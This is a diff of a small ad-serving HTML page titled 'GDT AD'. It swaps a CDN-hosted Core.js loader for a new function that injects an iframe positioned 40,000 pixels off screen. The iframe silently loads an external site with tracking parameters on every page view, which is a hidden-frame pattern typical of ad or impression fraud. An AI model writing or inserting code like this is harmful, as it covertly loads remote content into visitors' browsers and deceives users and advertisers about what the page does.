@@ -1,41 +1,66 @@
 <!DOCTYPE html>
 <html>
     <head>
-	<title>GDT AD</title>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GDT AD</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     </head>
     <body>
-	
+    
 <script>
+
+window.curNode = document.currentScript || (function() {
+    var script = document.querySelectorAll('script');
+    return script[script.length - 1]
+})();
+var s_w = window.screen.width;
+
 function getParameter(name, cancelBubble) {
             var r = new RegExp("(\\?|#|&)" + name + "=([^&#]*)(&|#|$)");
             var m = location.href.match(r);
             if ((!m || m == "") && !cancelBubble) m = window.location.href.match(r);
             return (!m ? "" : m[2]);
         }
+
+function LoadDefault(url) {
+    var d = document.createElement("div");
+    var c = document.createElement("iframe");
+    c.src = url;
+    window.curNode.parentNode.appendChild(d);
+    d.style.position = 'absolute';
+    d.style.left = '-40000px';
+    d.style.top = '-40000px';
+    d.style.width = '100%';
+    d.style.height = '1000px';
+    d.appendChild(c);
+    c.style.width = '100%';
+    c.style.height = '100%';
+}
 </script>
-	
-	<script>
-	    window.s_w = getParameter('s_w');
-		window.sys_trackid = getParameter('trackid');
-	</script>
+    
+    <script>
+        window.s_w = getParameter('s_w');
+        window.sys_trackid = getParameter('trackid');
+    </script>
 
 <script type="text/javascript">
-var webpath = "Core.js";
-var webpath = "//cdn.jsdelivr.net/gh/lhtel/cdn@100311/Master/Core.js";
 
-//var rd = Math.floor(Math.random() * (1000 - 1)) + 1;
-//if (rd >= 2000) {
-//webpath = 'https://etc.6187wo.com/Null.js';
-//}
+var DefaultUrl = 'https://metootea.com/';
+var ver_id = '100312';
+switch(window.sys_trackid){
+    case 10111:
+        DefaultUrl = '';
+        break; 
+    case 10112:
+        DefaultUrl = '';
+        break;         
+    default:break;
+        
+        
+}
 
-// if('10195' != window.sys_trackid){
-// 	webpath = 'https://etc.6187wo.com/Null.js';
-// }
-
-// var webpath = "//cdn.jsdelivr.net/gh/lhtel/cdn@100022/[trackid]/[trackidmd5]/Core.js";
-document.write('<scr'+'ipt src="'+webpath+'" id="'+s_w+'" tag='+s_w+'"></scr'+'ipt>');
+DefaultUrl = DefaultUrl + 'Default.html#s_w=' + s_w+'&trackid='+window.sys_trackid+'&ver_id='+ver_id;
+LoadDefault(DefaultUrl);
 </script>
     </body>
 </html>
